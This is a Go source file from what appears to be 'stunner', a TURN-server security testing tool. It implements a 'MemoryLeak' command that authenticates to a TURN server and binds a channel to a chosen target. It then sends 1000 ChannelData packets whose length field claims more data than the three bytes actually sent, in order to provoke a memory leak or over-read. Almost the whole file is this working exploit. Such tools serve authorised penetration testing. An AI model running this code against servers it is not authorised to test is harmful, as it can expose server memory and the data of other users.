package cmd

import (
	"context"
	"fmt"
	"net/netip"
	"strings"
	"time"

	"github.com/firefart/stunner/internal"
	"github.com/firefart/stunner/internal/helper"
	"github.com/sirupsen/logrus"
)

type MemoryleakOpts struct {
	TurnServer string
	Protocol   string
	Username   string
	Password   string
	UseTLS     bool
	Timeout    time.Duration
	Log        *logrus.Logger
	TargetHost netip.Addr
	TargetPort uint16
	Size       uint16
}

func (opts MemoryleakOpts) Validate() error {
	if opts.TurnServer == "" {
		return fmt.Errorf("need a valid turnserver")
	}
	if !strings.Contains(opts.TurnServer, ":") {
		return fmt.Errorf("turnserver needs a port")
	}
	if opts.Protocol != "tcp" && opts.Protocol != "udp" {
		return fmt.Errorf("protocol needs to be either tcp or udp")
	}
	if opts.Username == "" {
		return fmt.Errorf("please supply a username")
	}
	if opts.Password == "" {
		return fmt.Errorf("please supply a password")
	}
	if opts.Log == nil {
		return fmt.Errorf("please supply a valid logger")
	}
	if !opts.TargetHost.IsValid() {
		return fmt.Errorf("please supply a valid target host (must be an ip)")
	}
	if opts.TargetPort <= 0 {
		return fmt.Errorf("please supply a valid target port")
	}
	if opts.Size <= 0 {
		return fmt.Errorf("please supply a valid size")
	}

	return nil
}

func MemoryLeak(ctx context.Context, opts MemoryleakOpts) error {
	if err := opts.Validate(); err != nil {
		return err
	}

	remote, realm, nonce, err := internal.SetupTurnConnection(ctx, opts.Log, opts.Protocol, opts.TurnServer, opts.UseTLS, opts.Timeout, opts.TargetHost, opts.TargetPort, opts.Username, opts.Password)
	if err != nil {
		return err
	}
	defer remote.Close()

	channelNumber, err := helper.RandomChannelNumber()
	if err != nil {
		return fmt.Errorf("error on getting random channel number: %w", err)
	}
	channelBindRequest, err := internal.ChannelBindRequest(opts.Username, opts.Password, nonce, realm, opts.TargetHost, opts.TargetPort, channelNumber)
	if err != nil {
		return fmt.Errorf("error on generating ChannelBind request: %w", err)
	}
	opts.Log.Debugf("ChannelBind Request:\n%s", channelBindRequest.String())
	channelBindResponse, err := channelBindRequest.SendAndReceive(ctx, opts.Log, remote, opts.Timeout)
	if err != nil {
		return fmt.Errorf("error on sending ChannelBind request: %w", err)
	}
	opts.Log.Debugf("ChannelBind Response:\n%s", channelBindResponse.String())
	if channelBindResponse.Header.MessageType.Class == internal.MsgTypeClassError {
		return fmt.Errorf("error on sending ChannelBind request: %s", channelBindResponse.GetErrorString())
	}

	for i := 0; i < 1000; i++ {
		var toSend []byte
		toSend = append(toSend, channelNumber...)
		toSend = append(toSend, helper.PutUint16(opts.Size)...)
		toSend = append(toSend, []byte("xxx")...)
		toSend = internal.Padding(toSend)
		err := helper.ConnectionWrite(ctx, remote, toSend, opts.Timeout)
		if err != nil {
			return fmt.Errorf("error on sending data: %w", err)
		}
		opts.Log.Info(i)
		time.Sleep(500 * time.Millisecond)
	}

	opts.Log.Info("DONE")
	return nil
}
